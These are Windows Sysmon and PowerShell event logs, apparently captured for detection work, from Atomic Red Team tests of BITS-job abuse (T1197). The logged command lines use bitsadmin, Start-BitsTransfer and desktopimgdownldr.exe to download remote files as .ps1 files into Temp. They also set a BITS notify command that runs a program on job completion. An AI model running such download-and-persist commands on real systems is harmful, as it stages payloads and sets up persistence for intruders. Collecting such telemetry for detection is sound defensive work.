Atomic Test #1 - Bitsadmin Download (cmd)

Log1
09/03/2024 07:04:10 AM
LogName=Microsoft-Windows-Sysmon/Operational
EventCode=1
EventType=4
ComputerName=DESKTOP-43B3OH1
User=SYSTEM
Sid=S-1-5-18
SidType=1
SourceName=Microsoft-Windows-Sysmon
Type=信息
RecordNumber=379149
Keywords=None
TaskCategory=Process Create (rule: ProcessCreate)
OpCode=信息
Message=Process Create:
RuleName: -
UtcTime: 2024-09-02 23:04:10.865
ProcessGuid: {6f6dba56-446a-66d6-2a7e-2a0000001700}
ProcessId: 10576
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\Xuche\AppData\Local\Temp\bitsadmin1_flag.ps1
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-43B3OH1\xcy
LogonGuid: {6f6dba56-34a7-66d6-0a51-0c2102000000}
LogonId: 0x2210C510A
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=3FD6EB9A72446F34F309ADFAA6B8695EECD5B4B6,MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {6f6dba56-41b7-66d6-4c79-2a0000001700}
ParentProcessId: 7560
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\system32\cmd.exe" 
ParentUser: DESKTOP-43B3OH1\xcy
Collapse
host = DESKTOP-43B3OH1source = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2\T1197\T1197.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational

Atomic Test #2 - Bitsadmin Download (PowerShell)

Log1
10/01/2024 02:41:16 PM
LogName=Microsoft-Windows-PowerShell/Operational
EventCode=4104
EventType=5
ComputerName=DESKTOP-J7QIHDK
User=S-1-5-21-2868460691-234795373-3089146751-1001
Sid=S-1-5-21-2868460691-234795373-3089146751-1001
SidType=129
SourceName=Microsoft-Windows-PowerShell
Type=详细
RecordNumber=2559
Keywords=None
TaskCategory=执行远程命令
OpCode=在创建调用时
Message=正在创建 Scriptblock 文本(已完成 1，共 1):
Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\bitsadmin2_flag.ps1

ScriptBlock ID: d3df817e-339f-474e-accf-0f9bb262c961
路径: 
Collapse
host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2\T1197\T1197_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational


Atomic Test #3 - Persist, Download, & Execute

Log1
09/03/2024 07:04:52 AM
LogName=Microsoft-Windows-Sysmon/Operational
EventCode=1
EventType=4
ComputerName=DESKTOP-43B3OH1
User=SYSTEM
Sid=S-1-5-18
SidType=1
SourceName=Microsoft-Windows-Sysmon
Type=信息
RecordNumber=383049
Keywords=None
TaskCategory=Process Create (rule: ProcessCreate)
OpCode=信息
Message=Process Create:
RuleName: -
UtcTime: 2024-09-02 23:04:52.309
ProcessGuid: {6f6dba56-4494-66d6-737e-2a0000001700}
ProcessId: 103660
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: bitsadmin.exe  /complete AtomicBITS
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-43B3OH1\xcy
LogonGuid: {6f6dba56-34a7-66d6-0a51-0c2102000000}
LogonId: 0x2210C510A
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=3FD6EB9A72446F34F309ADFAA6B8695EECD5B4B6,MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {6f6dba56-41b7-66d6-4c79-2a0000001700}
ParentProcessId: 7560
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\system32\cmd.exe" 
ParentUser: DESKTOP-43B3OH1\xcy
Collapse
host = DESKTOP-43B3OH1source = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2\T1197\T1197.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational

Log2
09/03/2024 07:04:48 AM
LogName=Microsoft-Windows-Sysmon/Operational
EventCode=1
EventType=4
ComputerName=DESKTOP-43B3OH1
User=SYSTEM
Sid=S-1-5-18
SidType=1
SourceName=Microsoft-Windows-Sysmon
Type=信息
RecordNumber=382719
Keywords=None
TaskCategory=Process Create (rule: ProcessCreate)
OpCode=信息
Message=Process Create:
RuleName: -
UtcTime: 2024-09-02 23:04:48.247
ProcessGuid: {6f6dba56-4490-66d6-6e7e-2a0000001700}
ProcessId: 103068
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: bitsadmin.exe  /resume AtomicBITS
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-43B3OH1\xcy
LogonGuid: {6f6dba56-34a7-66d6-0a51-0c2102000000}
LogonId: 0x2210C510A
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=3FD6EB9A72446F34F309ADFAA6B8695EECD5B4B6,MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {6f6dba56-41b7-66d6-4c79-2a0000001700}
ParentProcessId: 7560
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\system32\cmd.exe" 
ParentUser: DESKTOP-43B3OH1\xcy
Collapse
host = DESKTOP-43B3OH1source = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2\T1197\T1197.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational

Log3
09/03/2024 07:04:48 AM
LogName=Microsoft-Windows-Sysmon/Operational
EventCode=1
EventType=4
ComputerName=DESKTOP-43B3OH1
User=SYSTEM
Sid=S-1-5-18
SidType=1
SourceName=Microsoft-Windows-Sysmon
Type=信息
RecordNumber=382687
Keywords=None
TaskCategory=Process Create (rule: ProcessCreate)
OpCode=信息
Message=Process Create:
RuleName: -
UtcTime: 2024-09-02 23:04:48.226
ProcessGuid: {6f6dba56-4490-66d6-6d7e-2a0000001700}
ProcessId: 91240
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: bitsadmin.exe  /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-43B3OH1\xcy
LogonGuid: {6f6dba56-34a7-66d6-0a51-0c2102000000}
LogonId: 0x2210C510A
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=3FD6EB9A72446F34F309ADFAA6B8695EECD5B4B6,MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {6f6dba56-41b7-66d6-4c79-2a0000001700}
ParentProcessId: 7560
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\system32\cmd.exe" 
ParentUser: DESKTOP-43B3OH1\xcy
Collapse
host = DESKTOP-43B3OH1source = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2\T1197\T1197.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational

Log4
09/03/2024 07:04:48 AM
LogName=Microsoft-Windows-Sysmon/Operational
EventCode=1
EventType=4
ComputerName=DESKTOP-43B3OH1
User=SYSTEM
Sid=S-1-5-18
SidType=1
SourceName=Microsoft-Windows-Sysmon
Type=信息
RecordNumber=382652
Keywords=None
TaskCategory=Process Create (rule: ProcessCreate)
OpCode=信息
Message=Process Create:
RuleName: -
UtcTime: 2024-09-02 23:04:48.203
ProcessGuid: {6f6dba56-4490-66d6-6c7e-2a0000001700}
ProcessId: 1124
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: bitsadmin.exe  /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\Xuche\AppData\Local\Temp\bitsadmin3_flag.ps1
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-43B3OH1\xcy
LogonGuid: {6f6dba56-34a7-66d6-0a51-0c2102000000}
LogonId: 0x2210C510A
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=3FD6EB9A72446F34F309ADFAA6B8695EECD5B4B6,MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {6f6dba56-41b7-66d6-4c79-2a0000001700}
ParentProcessId: 7560
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\system32\cmd.exe" 
ParentUser: DESKTOP-43B3OH1\xcy
Collapse
host = DESKTOP-43B3OH1source = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2\T1197\T1197.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational

Log5
09/03/2024 07:04:48 AM
LogName=Microsoft-Windows-Sysmon/Operational
EventCode=1
EventType=4
ComputerName=DESKTOP-43B3OH1
User=SYSTEM
Sid=S-1-5-18
SidType=1
SourceName=Microsoft-Windows-Sysmon
Type=信息
RecordNumber=382620
Keywords=None
TaskCategory=Process Create (rule: ProcessCreate)
OpCode=信息
Message=Process Create:
RuleName: -
UtcTime: 2024-09-02 23:04:48.182
ProcessGuid: {6f6dba56-4490-66d6-6b7e-2a0000001700}
ProcessId: 7712
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: bitsadmin.exe  /create AtomicBITS
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-43B3OH1\xcy
LogonGuid: {6f6dba56-34a7-66d6-0a51-0c2102000000}
LogonId: 0x2210C510A
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=3FD6EB9A72446F34F309ADFAA6B8695EECD5B4B6,MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {6f6dba56-41b7-66d6-4c79-2a0000001700}
ParentProcessId: 7560
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\system32\cmd.exe" 
ParentUser: DESKTOP-43B3OH1\xcy
Collapse
host = DESKTOP-43B3OH1source = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2\T1197\T1197.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational

Atomic Test #4 - Bits download using desktopimgdownldr.exe (cmd)

Log1
09/03/2024 07:05:27 AM
LogName=Microsoft-Windows-Sysmon/Operational
EventCode=1
EventType=4
ComputerName=DESKTOP-43B3OH1
User=SYSTEM
Sid=S-1-5-18
SidType=1
SourceName=Microsoft-Windows-Sysmon
Type=信息
RecordNumber=387204
Keywords=None
TaskCategory=Process Create (rule: ProcessCreate)
OpCode=信息
Message=Process Create:
RuleName: -
UtcTime: 2024-09-02 23:05:27.860
ProcessGuid: {6f6dba56-44b7-66d6-be7e-2a0000001700}
ProcessId: 3884
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd  /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-43B3OH1\xcy
LogonGuid: {6f6dba56-34a7-66d6-0a51-0c2102000000}
LogonId: 0x2210C510A
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {6f6dba56-41b7-66d6-4c79-2a0000001700}
ParentProcessId: 7560
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\system32\cmd.exe" 
ParentUser: DESKTOP-43B3OH1\xcy
Collapse
host = DESKTOP-43B3OH1source = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2\T1197\T1197.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational

Log2
09/03/2024 07:05:27 AM
LogName=Microsoft-Windows-Sysmon/Operational
EventCode=1
EventType=4
ComputerName=DESKTOP-43B3OH1
User=SYSTEM
Sid=S-1-5-18
SidType=1
SourceName=Microsoft-Windows-Sysmon
Type=信息
RecordNumber=387220
Keywords=None
TaskCategory=Process Create (rule: ProcessCreate)
OpCode=信息
Message=Process Create:
RuleName: -
UtcTime: 2024-09-02 23:05:27.888
ProcessGuid: {6f6dba56-44b7-66d6-bf7e-2a0000001700}
ProcessId: 105108
Image: C:\Windows\System32\desktopimgdownldr.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: desktopimgdownldr.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: desktopimgdownldr.exe
CommandLine: desktopimgdownldr.exe  /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-43B3OH1\xcy
LogonGuid: {6f6dba56-34a7-66d6-0a51-0c2102000000}
LogonId: 0x2210C510A
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=49734A44F294A362FEB6DAF24DED350CA01A1156,MD5=1F4F892D968A1053B1529124E010438B,SHA256=7367EAD88BC765CF3BAC87F0849D339AED3110D32D913E08099F17F5F25A3CCD,IMPHASH=4497ED51F6847EDEE6F31E6DE69B6378
ParentProcessGuid: {6f6dba56-44b7-66d6-be7e-2a0000001700}
ParentProcessId: 3884
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd  /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
ParentUser: DESKTOP-43B3OH1\xcy
Collapse
host = DESKTOP-43B3OH1source = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2\T1197\T1197.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational